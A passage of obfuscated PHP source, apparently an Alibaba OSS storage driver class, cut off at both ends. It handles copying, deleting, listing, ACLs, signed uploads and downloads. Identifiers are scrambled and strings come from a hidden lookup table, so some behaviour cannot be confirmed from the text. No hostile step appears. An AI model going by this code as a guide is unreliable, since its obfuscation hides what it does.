$¡­—Çëõ) { if ($¡­—Çëõ->getKey() == $äŠ½ºƒĞ) { continue; } $˜ÒªşâÔ = $¡­—Çëõ->getKey(); $ ˆ—‚ˆ¸ = $¡­—Çëõ->getSize(); $—ºï¦ë¡ = $ ˆ—‚ˆ¸ == 0 && substr($˜ÒªşâÔ, strlen($˜ÒªşâÔ) - 1, 1) == $İĞİÚ±[8] ? !0 : !1; if ($—ºï¦ë¡) { continue; } (yield $ ˆ—‚ˆ¸ . $İĞİÚ±[214] . $˜ÒªşâÔ); } if ($âË·ÉÕ¸ === $İĞİÚ±[12]) { break; } } } public function copyFile($ûÒ†Ó­ğ, $úÓŞ³õ») { $„÷ª½´ = $this->size($ûÒ†Ó­ğ); if ($„÷ª½´ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ûÒ†Ó­ğ, $this->bucket, $this->pathEncode($úÓŞ³õ»)); } catch (OSS\Core\OssException $Â³œ…Ã›) { $this->writeLog(__FUNCTION__ . $_SERVER[‹è™Ü¸Ñ][214] . $Â³œ…Ã›->getMessage()); return !1; } return $this->getPathOuter($úÓŞ³õ»); } $ÚÜ¤É¨Î = $this->multiCopyObject($ûÒ†Ó­ğ, $úÓŞ³õ», $„÷ª½´); return $ÚÜ¤É¨Î ? $this->getPathOuter($úÓŞ³õ») : !1; } private function multiCopyObject($…æ«°õ, $ˆñÔáÅ³, $ìËÒÁÜ¬) { $¯‹›• =& $_SERVER[‹è™Ü¸Ñ]; try { $İ£À©úÈ = array(); if ($½ÎÉ³â» = $this->hashMd5($…æ«°õ)) { $İ£À©úÈ = array(OSS\OssClient::OSS_HEADERS => array($¯‹›•[1458] => $½ÎÉ³â»)); } $‡µ¹®ù = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ˆñÔáÅ³), $İ£À©úÈ); $†¿ú¤îè = 1; $Éı¹Ôğ = 0; $¤³ÍğÂ = array(); $´èŞ æ‡ = 1024 * 1024 * 10; $öÑ£×Ç = $this->client->generateMultiuploadParts($ìËÒÁÜ¬, $´èŞ æ‡); foreach ($öÑ£×Ç as $¯¦äÆâì => $””ŞŞüó) { $´ûıá€È = $Éı¹Ôğ + (int) $””ŞŞüó[$¯‹›•[1459]]; $ş‚¥Šˆä = (int) $””ŞŞüó[$¯‹›•[413]] + $´ûıá€È - 1; $ŒÜ£ë™ = array($¯‹›•[167] => $´ûıá€È, $¯‹›•[168] => $ş‚¥Šˆä); $¤³ÍğÂ[] = $this->client->uploadPartCopy($this->bucket, $…æ«°õ, $this->bucket, $this->pathEncode($ˆñÔáÅ³), $†¿ú¤îè, $‡µ¹®ù, $ŒÜ£ë™); $†¿ú¤îè = $†¿ú¤îè + 1; } $¿‚«§Û = array(); foreach ($¤³ÍğÂ as $¯¦äÆâì => $•º×ˆ) { $¿‚«§Û[] = array($¯‹›•[308] => $¯¦äÆâì + 1, $¯‹›•[309] => $•º×ˆ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ˆñÔáÅ³), $‡µ¹®ù, $¿‚«§Û); } catch (OSS\Core\OssException $•Ô£ŒØ) { $this->writeLog(__FUNCTION__ . $¯‹›•[214] . $•Ô£ŒØ->getMessage()); return !1; } return !0; } public function moveFile($õ–¢Á¿‰, $¤¾Ç©Î) { if ($this->copyFile($õ–¢Á¿‰, $¤¾Ç©Î)) { $this->remove($õ–¢Á¿‰); return $this->getPathOuter($¤¾Ç©Î); } return !1; } public function delFile($¸îÅÃ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($¸îÅÃ)); } catch (OSS\Core\OssException $…ı½İ††) { $this->writeLog(__FUNCTION__ . $_SERVER[‹è™Ü¸Ñ][214] . $…ı½İ††->getMessage()); return !1; } return !0; } public function delFolder($Š¢äŸáñ) { $Ô˜ÇÚş— =& $_SERVER[‹è™Ü¸Ñ]; if (!$this->exist($Š¢äŸáñ)) { return !0; } $this->listItemCache = !1; $”×åÜ³ = $this->fileList($Š¢äŸáñ); $this->listItemCache = !0; $îÍÉã´ã = trim($Š¢äŸáñ, $Ô˜ÇÚş—[8]) . $Ô˜ÇÚş—[8]; if (!empty($Š¢äŸáñ) && $Š¢äŸáñ !== $Ô˜ÇÚş—[228] && !in_array($îÍÉã´ã, $”×åÜ³[$Ô˜ÇÚş—[85]])) { $”×åÜ³[$Ô˜ÇÚş—[85]][] = $îÍÉã´ã; } $¡¤ø¶¶ = $this->delByBatch($”×åÜ³[$Ô˜ÇÚş—[86]]); if (!$¡¤ø¶¶) { return !1; } $¡¤ø¶¶ = $this->delByBatch($”×åÜ³[$Ô˜ÇÚş—[85]]); if (!$¡¤ø¶¶) { return !1; } return $this->delFile($îÍÉã´ã); } private function delByBatch($Í×Ù›Ê›) { foreach (array_chunk($Í×Ù›Ê›, 1000) as $ìáõ¹äë) { try { $this->client->deleteObjects($this->bucket, $ìáõ¹äë); } catch (OSS\Core\OssException $£â• Ü) { $this->writeLog(__FUNCTION__ . $_SERVER[‹è™Ü¸Ñ][214] . $£â• Ü->getMessage()); return !1; } } return !0; } public function rename($Ò§ùÅÈ©, $Í ª×ŒÃ) { return $this->renameObject($Ò§ùÅÈ©, $Í ª×ŒÃ); } private function fileInfo($¼òº³ş½, $öñÅïíæ = false, $•ŞÀıµ± = array()) { $şìâÃ =& $_SERVER[‹è™Ü¸Ñ]; $Ó®…Â = array($şìâÃ[32] => $this->pathThis($¼òº³ş½), $şìâÃ[87] => $this->getPathOuter($¼òº³ş½), $şìâÃ[33] => $şìâÃ[230], $şìâÃ[79] => isset($•ŞÀıµ±[$şìâÃ[79]]) ? $•ŞÀıµ±[$şìâÃ[79]] : 0, $şìâÃ[169] => $this->ext($¼òº³ş½)); if ($öñÅïíæ) { return $Ó®…Â; } $Ó®…Â[$şìâÃ[231]] = $Ó®…Â[$şìâÃ[88]] = 0; $Ó®…Â[$şìâÃ[232]] = $Ó®…Â[$şìâÃ[233]] = !0; if (empty($•ŞÀıµ±)) { $øË’³íÂ = $this->objectMeta($¼òº³ş½); if (!$øË’³íÂ) { return $Ó®…Â; } $•ŞÀıµ± = array($şìâÃ[88] => strtotime($øË’³íÂ[$şìâÃ[1457]]), $şìâÃ[79] => $øË’³íÂ[$şìâÃ[1456]] + 0, $şìâÃ[1455] => $øË’³íÂ[$şìâÃ[1455]]); } if (isset($•ŞÀıµ±[$şìâÃ[1455]]) && $•ŞÀıµ±[$şìâÃ[1455]]) { $Ó®…Â[$şìâÃ[235]] = trim($•ŞÀıµ±[$şìâÃ[1455]], $şìâÃ[121]); } if (isset($•ŞÀıµ±[$şìâÃ[79]])) { $Ó®…Â[$şìâÃ[79]] = $•ŞÀıµ±[$şìâÃ[79]]; } if (isset($•ŞÀıµ±[$şìâÃ[88]])) { $Ó®…Â[$şìâÃ[88]] = $•ŞÀıµ±[$şìâÃ[88]]; } if (isset($•ŞÀıµ±[$şìâÃ[206]]) && !trim($Ó®…Â[$şìâÃ[88]])) { $Ó®…Â[$şìâÃ[88]] = $•ŞÀıµ±[$şìâÃ[206]]; } return $Ó®…Â; } private function folderInfo($Ì†¬€ßÕ, $¡á³µ”À = false, $üèÓŒ¤ = array()) { $æÀü»´ =& $_SERVER[‹è™Ü¸Ñ]; $‹ëÌ×ä = array($æÀü»´[32] => $this->pathThis($Ì†¬€ßÕ), $æÀü»´[87] => $this->getPathOuter($æÀü»´[8] . $Ì†¬€ßÕ), $æÀü»´[33] => $æÀü»´[78]); if ($¡á³µ”À) { return $‹ëÌ×ä; } $‹ëÌ×ä[$æÀü»´[231]] = $‹ëÌ×ä[$æÀü»´[88]] = 0; $‹ëÌ×ä[$æÀü»´[232]] = $‹ëÌ×ä[$æÀü»´[233]] = !0; if (empty($üèÓŒ¤)) { $Ì†¬€ßÕ = rtrim($Ì†¬€ßÕ, $æÀü»´[8]) . $æÀü»´[8]; $ü—İÁà® = $this->objectMeta($Ì†¬€ßÕ); if (!$ü—İÁà®) { return $‹ëÌ×ä; } $üèÓŒ¤ = array($æÀü»´[231] => $ü—İÁà®[$æÀü»´[575]][$æÀü»´[1460]], $æÀü»´[88] => strtotime($ü—İÁà®[$æÀü»´[1457]])); } if (isset($üèÓŒ¤[$æÀü»´[88]])) { $‹ëÌ×ä[$æÀü»´[88]] = $üèÓŒ¤[$æÀü»´[88]]; } if (isset($üèÓŒ¤[$æÀü»´[231]])) { $‹ëÌ×ä[$æÀü»´[231]] = $üèÓŒ¤[$æÀü»´[231]]; } return $‹ëÌ×ä; } public function listPath($²‹â­Á, $€ÄˆÁ®¥ = false) { $Š½­İ¶ =& $_SERVER[‹è™Ü¸Ñ]; $å€›Ş…Û = $this->fileList($²‹â­Á, $Š½­İ¶[8], !0); foreach ($å€›Ş…Û[$Š½­İ¶[85]] as $¾¹‚Ç¬ı => $Ç¿ÂÁ½Î) { $å€›Ş…Û[$Š½­İ¶[85]][$¾¹‚Ç¬ı] = $this->folderInfo($Ç¿ÂÁ½Î, $€ÄˆÁ®¥, $Ç¿ÂÁ½Î); } foreach ($å€›Ş…Û[$Š½­İ¶[86]] as $¾¹‚Ç¬ı => $Ç¿ÂÁ½Î) { $å€›Ş…Û[$Š½­İ¶[86]][$¾¹‚Ç¬ı] = $this->fileInfo($Ç¿ÂÁ½Î[$Š½­İ¶[32]], $€ÄˆÁ®¥, $Ç¿ÂÁ½Î); } return $å€›Ş…Û; } protected function infoChildren($±„í÷Ë‰, &$ƒ¬†ì×ª) { $äÀ‚¤–ª =& $_SERVER[‹è™Ü¸Ñ]; $ûñÊÖ¾ø = $this->fileList($±„í÷Ë‰, $äÀ‚¤–ª[12], !0); $ƒ¬†ì×ª[$äÀ‚¤–ª[81]] += count($ûñÊÖ¾ø[$äÀ‚¤–ª[85]]); $ƒ¬†ì×ª[$äÀ‚¤–ª[80]] += count($ûñÊÖ¾ø[$äÀ‚¤–ª[86]]); foreach ($ûñÊÖ¾ø[$äÀ‚¤–ª[86]] as $ñİ‡—â‡) { if (!$ñİ‡—â‡ || !$ñİ‡—â‡[$äÀ‚¤–ª[79]]) { continue; } $ƒ¬†ì×ª[$äÀ‚¤–ª[79]] += $ñİ‡—â‡[$äÀ‚¤–ª[79]]; } } public function has($ÜÁÉŞ©‘, $áëº‰±Ë = false, $Û³ú©•î = true) { $ØÇ‘ö¨× =& $_SERVER[‹è™Ü¸Ñ]; $ÜÁÉŞ©‘ = trim($ÜÁÉŞ©‘, $ØÇ‘ö¨×[8]); $Øƒˆ™ö = empty($ÜÁÉŞ©‘) && $ÜÁÉŞ©‘ !== $ØÇ‘ö¨×[228] ? $ØÇ‘ö¨×[12] : $ÜÁÉŞ©‘ . $ØÇ‘ö¨×[8]; $ü´§ë¬ê = $ØÇ‘ö¨×[12]; $¸Ùğ¢’… = 500; $ƒèßğ† = $»°µ¼¬ = 0; while (!0) { check_abort(); $¨¤ÁşÉ˜ = array($ØÇ‘ö¨×[1451] => $ØÇ‘ö¨×[8], $ØÇ‘ö¨×[1452] => $Øƒˆ™ö, $ØÇ‘ö¨×[1453] => $¸Ùğ¢’…, $ØÇ‘ö¨×[1454] => $ü´§ë¬ê); try { $ªÀÏÂ¦¹ = $this->client->listObjects($this->bucket, $¨¤ÁşÉ˜); } catch (OSS\Core\OssException $”º‡ÂÛ˜) { $this->writeLog(__FUNCTION__ . $ØÇ‘ö¨×[214] . $”º‡ÂÛ˜->getMessage()); break; } $ü´§ë¬ê = $ªÀÏÂ¦¹->getNextMarker(); $ÕÆ´·µ‡ = $ªÀÏÂ¦¹->getObjectList(); $úÅµÒùï = $ªÀÏÂ¦¹->getPrefixList(); if ($áëº‰±Ë) { if (count($ÕÆ´·µ‡) > 1 || count($ÕÆ´·µ‡) == 1 && $ÕÆ´·µ‡[0]->getKey() != $Øƒˆ™ö) { $ƒèßğ† += count($ÕÆ´·µ‡) - 1; } if (!empty($úÅµÒùï)) { $»°µ¼¬ += count($úÅµÒùï); } if ($ü´§ë¬ê === $ØÇ‘ö¨×[12]) { break; } continue; } if ($Û³ú©•î) { if (!empty($ÕÆ´·µ‡)) { if (count($ÕÆ´·µ‡) > 1 || $ÕÆ´·µ‡[0]->getKey() != $Øƒˆ™ö) { return !0; } } } else { if (!empty($úÅµÒùï)) { return !0; } } if ($ü´§ë¬ê === $ØÇ‘ö¨×[12]) { break; } } if ($áëº‰±Ë) { return array($ØÇ‘ö¨×[239] => $ƒèßğ†, $ØÇ‘ö¨×[240] => $»°µ¼¬); } return !1; } public function listAll($Üã™Ëæî) { $†“éÕœ¸ =& $_SERVER[‹è™Ü¸Ñ]; $ÆÃØ“ëê = $this->fileList($Üã™Ëæî, $†“éÕœ¸[12], !0); $§¨¾¢ñ‘ = array_to_keyvalue($ÆÃØ“ëê[$†“éÕœ¸[86]], $†“éÕœ¸[32]); foreach ($ÆÃØ“ëê[$†“éÕœ¸[85]] as $¾½µœŸã) { if (is_string($¾½µœŸã)) { $§¨¾¢ñ‘[$¾½µœŸã] = array($†“éÕœ¸[79] => 0); } } return $this->listAllFiles($Üã™Ëæî, $§¨¾¢ñ‘); } public function canRead($ß¨ıÃŠê) { $Ş¦Ÿ¼ñğ =& $_SERVER[‹è™Ü¸Ñ]; $¸íõïã¹ = $this->pathAcl($ß¨ıÃŠê); return $¸íõïã¹ == $Ş¦Ÿ¼ñğ[1461] || $¸íõïã¹ == $Ş¦Ÿ¼ñğ[619] ? !0 : !1; } public function canWrite($¶°‰Ä·›) { $šäç²›ƒ = $this->pathAcl($¶°‰Ä·›); return $šäç²›ƒ == $_SERVER[‹è™Ü¸Ñ][619] ? !0 : !1; } public function pathAcl($¶ÌÓ”ƒ«) { $ö¡Ÿç =& $_SERVER[‹è™Ü¸Ñ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $Çö©ã¹ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($¶ÌÓ”ƒ«)); } catch (OSS\Core\OssException $úíÂÛÑÂ) { $this->writeLog(__FUNCTION__ . $ö¡Ÿç[214] . $úíÂÛÑÂ->getMessage()); return !1; } $€Ä‹Àæ = $Çö©ã¹ == $ö¡Ÿç[37] ? $this->bucketAcl : $Çö©ã¹; if ($€Ä‹Àæ == $ö¡Ÿç[1462]) { return $ö¡Ÿç[1461]; } if ($€Ä‹Àæ == $ö¡Ÿç[1463]) { return $ö¡Ÿç[619]; } return $€Ä‹Àæ; } private function chmodPath($èÈÃÖ, $ŞÁ¤¦¼ = '') { $…şùÉ§Ü =& $_SERVER[‹è™Ü¸Ñ]; $Îç¿ãĞ‚ = empty($ŞÁ¤¦¼) ? $…şùÉ§Ü[1463] : $ŞÁ¤¦¼; $ê Ô÷Ï˜ = array($…şùÉ§Ü[37], $…şùÉ§Ü[229], $…şùÉ§Ü[1462], $…şùÉ§Ü[1463]); if (!in_array($Îç¿ãĞ‚, $ê Ô÷Ï˜)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($èÈÃÖ), $Îç¿ãĞ‚); } catch (OSS\Core\OssException $´À§íõ) { $this->writeLog(__FUNCTION__ . $…şùÉ§Ü[214] . $´À§íõ->getMessage()); return !1; } return !0; } public function getContent($Ò¶ïÕ—õ) { return $this->fileSubstr($Ò¶ïÕ—õ, -1); } public function setContent($‘¢ÉÌ†§, $Ü¦èàš˜ = '') { $‘æ¹‰èú =& $_SERVER[‹è™Ü¸Ñ]; try { $õçûáÀÀ = $this->trafficLimit($‘æ¹‰èú[1464]); $Ç»ØÜØ = $this->client->putObject($this->bucket, $this->pathEncode($‘¢ÉÌ†§), $Ü¦èàš˜, $õçûáÀÀ); } catch (OSS\Core\OssException $ä¾€ú»ı) { $this->writeLog(__FUNCTION__ . $‘æ¹‰èú[214] . $ä¾€ú»ı->getMessage()); return !1; } $¡öÓÚ¦ = array($‘æ¹‰èú[1458] => trim($Ç»ØÜØ[$‘æ¹‰èú[1455]], $‘æ¹‰èú[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($‘¢ÉÌ†§))); $this->updateObjMeta($‘¢ÉÌ†§, $¡öÓÚ¦); return isset($Ç»ØÜØ[$‘æ¹‰èú[1465]][$‘æ¹‰èú[292]]) ? !0 : !1; } private function updateObjMeta($Õßè‹³, $ÂØ±öùÉ) { $Õßè‹³ = $this->pathEncode($Õßè‹³); try { $–º’ºÎù = array(OSS\OssClient::OSS_HEADERS => $ÂØ±öùÉ); $this->client->copyObject($this->bucket, $Õßè‹³, $this->bucket, $Õßè‹³, $–º’ºÎù); } catch (OSS\Core\OssException $ğ‡‹µ¯ı) { $this->writeLog(__FUNCTION__ . $_SERVER[‹è™Ü¸Ñ][214] . $ğ‡‹µ¯ı->getMessage()); return !1; } return !0; } public function upload($¥Œ†Ñ…, $¸Ğ”Æáà, $€Èü‹³ã = false, $²¢¦’ = REPEAT_REPLACE) { $ªˆÇ¡Å =& $_SERVER[‹è™Ü¸Ñ]; $°£æŒĞ = trim($¥Œ†Ñ…, $ªˆÇ¡Å[8]); $¡å®øÑ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ªˆÇ¡Å[1458] => @md5_file($¸Ğ”Æáà)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¥Œ†Ñ…))); $¡å®øÑ = $this->trafficLimit($ªˆÇ¡Å[1464], $¡å®øÑ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($°£æŒĞ), $¸Ğ”Æáà, $¡å®øÑ); } catch (OSS\Core\OssException $Û»öô³¶) { $this->writeLog(__FUNCTION__ . $ªˆÇ¡Å[214] . $Û»öô³¶->getMessage()); return !1; } return $this->getPathOuter($¥Œ†Ñ…); } public function getHost() { $Òƒ¤È¾í =& $_SERVER[‹è™Ü¸Ñ]; $¦Ñ²½µÜ = explode($Òƒ¤È¾í[210], parent::getHost()); return $¦Ñ²½µÜ[0] . $Òƒ¤È¾í[210] . $this->bucket . $Òƒ¤È¾í[10] . $¦Ñ²½µÜ[1]; } public function uploadFormData($ñ¶ˆŸÔ, $†Æß¨µ = 3600) { $½ùö§å’ =& $_SERVER[‹è™Ü¸Ñ]; if (!($é¡œìÆı = $this->getHost())) { return !1; } $Ò¹õ ³Ş = $†Æß¨µ; $»÷³«½¹ = date($½ùö§å’[1466], time() + $Ò¹õ ³Ş); $ô¥îƒØ´ = new DateTime($»÷³«½¹); $ÂÛıû­ = $ô¥îƒØ´->format(DateTime::ISO8601); $±äò®Š› = strpos($ÂÛıû­, $½ùö§å’[372]); $ÂÛıû­ = substr($ÂÛıû­, 0, $±äò®Š›) . $½ùö§å’[1467]; $°Ëõ†ÊÒ = 1048576000 * 5; $”å­÷ôè = $this->pathFather($ñ¶ˆŸÔ); $İæŠ™çî = array($½ùö§å’[275] => $ÂÛıû­, $½ùö§å’[278] => array(array($½ùö§å’[1468], 0, $°Ëõ†ÊÒ), array($½ùö§å’[281], $½ùö§å’[282], $”å­÷ôè))); $Õ•Äõ˜° = base64_encode(json_encode($İæŠ™çî)); $æ¶Ù–¹• = base64_encode(hash_hmac($½ùö§å’[263], $Õ•Äõ˜°, $this->secret, !0)); $¥şşé›¤ = array($½ùö§å’[293] => $Õ•Äõ˜°, $½ùö§å’[1469] => $this->accessKey, $½ùö§å’[285] => $½ùö§å’[274], $½ùö§å’[1470] => $æ¶Ù–¹•, $½ùö§å’[208] => $é¡œìÆı); $¥şşé›¤ = $this->trafficLimit($½ùö§å’[1464], $¥şşé›¤); return $¥şşé›¤; } public function multiUploadFormData($£ë°ğÌÒ, $É·«œàÆ = 3600) { $ÓÏ§¼ãÉ =& $_SERVER[‹è™Ü¸Ñ]; if (!($èğíÀÅ = $this->getHost())) { return !1; } $ú ·¶ã = $this->trafficLimit($ÓÏ§¼ãÉ[1464]); $¨İúŒäç = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($£ë°ğÌÒ), $ú ·¶ã); return array($ÓÏ§¼ãÉ[254] => $¨İúŒäç, $ÓÏ§¼ãÉ[208] => $èğíÀÅ . $ÓÏ§¼ãÉ[8] . $this->pathEncode($£ë°ğÌÒ), $ÓÏ§¼ãÉ[255] => gmdate($ÓÏ§¼ãÉ[1471]), $ÓÏ§¼ãÉ[97] => $£ë°ğÌÒ); } public function multiUploadAuthData($»êª¾±¤, $—ìĞÌÅ§ = array()) { $–Ôˆ·ÍÛ =& $_SERVER[‹è™Ü¸Ñ]; $¸²©¬†Ô = isset($—ìĞÌÅ§[$–Ôˆ·ÍÛ[255]]) ? $—ìĞÌÅ§[$–Ôˆ·ÍÛ[255]] : gmdate($–Ôˆ·ÍÛ[1471]); $©õÊåñ = isset($—ìĞÌÅ§[$–Ôˆ·ÍÛ[169]]) ? $—ìĞÌÅ§[$–Ôˆ·ÍÛ[169]] : $–Ôˆ·ÍÛ[12]; $ó±¦Úêà = $»êª¾±¤; if (isset($—ìĞÌÅ§[$–Ôˆ·ÍÛ[97]])) { $ó±¦Úêà = $—ìĞÌÅ§[$–Ôˆ·ÍÛ[97]]; unset($—ìĞÌÅ§[$–Ôˆ·ÍÛ[97]]); } if (isset($—ìĞÌÅ§[$–Ôˆ·ÍÛ[256]])) { $—ìĞÌÅ§[$–Ôˆ·ÍÛ[255]] = $¸²©¬†Ô; return $this->listUploadParts($ó±¦Úêà, $—ìĞÌÅ§); } $ƒ¸³¬ûò = array($–Ôˆ·ÍÛ[257], $–Ôˆ·ÍÛ[12], $–Ôˆ·ÍÛ[123], $¸²©¬†Ô, "\170\x2d\157\163\x73\x2d\x64\x61\164\x65\72{$¸²©¬†Ô}", $–Ôˆ·ÍÛ[8] . $this->bucket . $–Ôˆ·ÍÛ[8] . $ó±¦Úêà . $©õÊåñ); if (strpos($©õÊåñ, $–Ôˆ·ÍÛ[258]) === 0) { $ƒ¸³¬ûò[0] = $–Ôˆ·ÍÛ[259]; if ($ÉÑ­¥†ï = $this->trafficLimit($–Ôˆ·ÍÛ[1464])) { $ó±¦Úêà = $–Ôˆ·ÍÛ[1472]; array_splice($ƒ¸³¬ûò, 5, 0, $ó±¦Úêà . $–Ôˆ·ÍÛ[4] . $ÉÑ­¥†ï[$ó±¦Úêà]); } } if (isset($—ìĞÌÅ§[$–Ôˆ·ÍÛ[260]]) && $—ìĞÌÅ§[$–Ôˆ·ÍÛ[260]] == $–Ôˆ·ÍÛ[261]) { $ƒ¸³¬ûò[0] = $–Ôˆ·ÍÛ[261]; } if (!empty($—ìĞÌÅ§[$–Ôˆ·ÍÛ[1473]])) { $à¢ª¾ã = array_merge(array($ƒ¸³¬ûò[4]), $—ìĞÌÅ§[$–Ôˆ·ÍÛ[1473]]); sort($à¢ª¾ã); $ƒ¸³¬ûò[4] = implode($–Ôˆ·ÍÛ[262], $à¢ª¾ã); } $Ì·‹¡£ = implode($–Ôˆ·ÍÛ[262], $ƒ¸³¬ûò); $ú–’³€¥ = base64_encode(hash_hmac($–Ôˆ·ÍÛ[263], $Ì·‹¡£, $this->secret, !0)); $œß°ôé¸ = $–Ôˆ·ÍÛ[1441] . $this->accessKey . $–Ôˆ·ÍÛ[4] . $ú–’³€¥; if (strpos($©õÊåñ, $–Ôˆ·ÍÛ[258]) === 0) { $œß°ôé¸ = array($–Ôˆ·ÍÛ[265] => $œß°ôé¸, $–Ôˆ·ÍÛ[255] => $¸²©¬†Ô); if ($ÉÑ­¥†ï) { $œß°ôé¸ = array_merge($œß°ôé¸, $ÉÑ­¥†ï); } } return $œß°ôé¸; } public function listUploadParts($Øİ®îä, $Ì›ˆŠìÓ) { $ÄæŠÉÈ€ =& $_SERVER[‹è™Ü¸Ñ]; $…¤ÙŸçÜ = parse_url_query($Ì›ˆŠìÓ[$ÄæŠÉÈ€[169]]); $ìéÎÙ’ˆ = $this->client->listParts($this->bucket, $this->pathEncode($Øİ®îä), $…¤ÙŸçÜ[$ÄæŠÉÈ€[254]]); $åö÷¤éŒ = $ìéÎÙ’ˆ->getListPart(); $ñ²¦™Ù = array(); foreach ($åö÷¤éŒ as $Áğ·ã­¥) { $ñ²¦™Ù[] = array($ÄæŠÉÈ€[308] => $Áğ·ã­¥->getPartNumber(), $ÄæŠÉÈ€[309] => trim($Áğ·ã­¥->getETag(), $ÄæŠÉÈ€[121])); } unset($Ì›ˆŠìÓ[$ÄæŠÉÈ€[256]], $Ì›ˆŠìÓ[$ÄæŠÉÈ€[260]]); $¾™™»­ = $this->multiUploadAuthData($Øİ®îä, $Ì›ˆŠìÓ); if (empty($¾™™»­)) { return !1; } return array($ÄæŠÉÈ€[265] => $¾™™»­, $ÄæŠÉÈ€[255] => $Ì›ˆŠìÓ[$ÄæŠÉÈ€[255]], $ÄæŠÉÈ€[267] => $ñ²¦™Ù); } public function download($ïá“í‡œ, $ë²Ù’À›) { $é”ûà ¿ =& $_SERVER[‹è™Ü¸Ñ]; if ($this->isFolder($ïá“í‡œ)) { return !1; } try { $û•º¥‹’ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ë²Ù’À›); $û•º¥‹’ = $this->trafficLimit($é”ûà ¿[112], $û•º¥‹’); $this->client->getObject($this->bucket, $this->pathEncode($ïá“í‡œ), $û•º¥‹’); } catch (OSS\Core\OssException $„‚«ÖïÓ) { $this->writeLog(__FUNCTION__ . $é”ûà ¿[214] . $„‚«ÖïÓ->getMessage()); return !1; } return $ë²Ù’À›; } public function fileSubstr($½©ãÚŞ, $»Çí©­† = 0, $…ìêº¤” = false) { if ($»Çí©­† === -1) { $°ÑìüıÙ = array(); } else { if ($…ìêº¤” === !1) { $¾Ñ”²¦¦ = $this->size($½©ãÚŞ); } else { $¾Ñ”²¦¦ = $»Çí©­† + $…ìêº¤” - 1; } $°ÑìüıÙ = array(OSS\OssClient::OSS_RANGE => "{$»Çí©­†}\55{$¾Ñ”²¦¦}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($½©ãÚŞ), $°ÑìüıÙ); } catch (OSS\Core\OssException $ÁôÒ—‰Å) { $this->writeLog(__FUNCTION__ . $_SERVER[‹è™Ü¸Ñ][214] . $ÁôÒ—‰Å->getMessage()); think_exception($ÁôÒ—‰Å->getMessage()); return !1; } } private function trafficLimit($û‡”°ÛÃ, $›Ö‘„´¼ = array()) { $¸ÖºÎ¦Â =& $_SERVER[‹è™Ü¸Ñ]; if ($û‡”°ÛÃ == $¸ÖºÎ¦Â[1464] && $this->isUploadServer() || $û‡”°ÛÃ == $¸ÖºÎ¦Â[112] && $this->isFileOutServer()) { return $›Ö‘„´¼; } $íŸ–×Ú = floatval($GLOBALS[$¸ÖºÎ¦Â[6]][$¸ÖºÎ¦Â[92]][$¸ÖºÎ¦Â[110]][$û‡”°ÛÃ]) * 1024 * 1024 * 8; if (!$íŸ–×Ú) { return $›Ö‘„´¼; } $íŸ–×Ú = $íŸ–×Ú < 819200 ? 819200 : ($íŸ–×Ú > 838860800 ? 838860800 : $íŸ–×Ú); $›Ö‘„´¼[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($íŸ–×Ú); return $›Ö‘„´¼; } public function link($ç™Ş£Âç, $ıÒ« = array()) { $ı€µ„Ñ =& $_SERVER[‹è™Ü¸Ñ]; if (!$this->exist($ç™Ş£Âç) || $this->isFolder($ç™Ş£Âç)) { return !1; } try { $ıÒ« = $this->trafficLimit($ı€µ„Ñ[112], $ıÒ«); $ì¯”´›ö = $this->client->signUrl($this->bucket, $this->pathEncode($ç™Ş£Âç), 3600 * 12, $ı€µ„Ñ[261], $ıÒ«); return $this->getCdnLink($ì¯”´›ö); } catch (OSS\Core\OssException $¼æ¬©šğ) { $this->writeLog(__FUNCTION__ . $ı€µ„Ñ[214] . $¼æ¬©šğ->getMessage()); return !1; } } public function fileOut($Ä®ûú”, $°—í’×û = false, $âŠÏğã® = false, $À°ËäËÌ = '') { $çù¹ª­Ú =& $_SERVER[‹è™Ü¸Ñ]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ä®ûú”, $°—í’×û, $âŠÏğã®, $À°ËäËÌ); } if (!$âŠÏğã®) { $âŠÏğã® = $this->pathThis($Ä®ûú”); } $âŠÏğã® = rawurlencode($âŠÏğã®); $ÀÙ¤ÜÉ = get_file_mime(get_path_ext($âŠÏğã®)); if ($ÀÙ¤ÜÉ == $çù¹ª­Ú[248]) { return parent::fileOut($Ä®ûú”, $°—í’×û, $âŠÏğã®, $À°ËäËÌ); } $°—í’×û = $°—í’×û ? $çù¹ª­Ú[1474] : $çù¹ª­Ú[1475]; $şÓšÙøÏ = array(OSS\OssClient::OSS_SUB_RESOURCE => $çù¹ª­Ú[1476] . rawurlencode("{$°—í’×û}\73\146\x69\x6c\145\x6e\141\155\x65\75{$âŠÏğã®}")); $şÓšÙøÏ[OSS\OssClient::OSS_SUB_RESOURCE] .= $çù¹ª­Ú[1477] . rawurlencode($ÀÙ¤ÜÉ); $ÊàÄİÆ = $this->link($Ä®ûú”, $şÓšÙøÏ); $this->fileOutLink($ÊàÄİÆ); } public function fileOutServer($˜¢Í—¬ , $ŒÈ¶°Ìµ = false, $ÓÖˆÒ€ = false, $ÂíÓ¥ì = '') { parent::fileOut($˜¢Í—¬ , $ŒÈ¶°Ìµ, $ÓÖˆÒ€, $ÂíÓ¥ì); } public function fileOutImage($¯¿„Í¶¸, $‡£îü¸ = 250) { if ($this->size($¯¿„Í¶¸) > 1024 * 1024 * 20) { return $this->fileOutImageServer($¯¿„Í¶¸, $‡£îü¸); } $ßÌÔ‡»€ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[‹è™Ü¸Ñ][1438] . $‡£îü¸); $±íÃ­æ‚ = $this->link($¯¿„Í¶¸, $ßÌÔ‡»€); $this->fileOutLink($±íÃ­æ‚); } public function 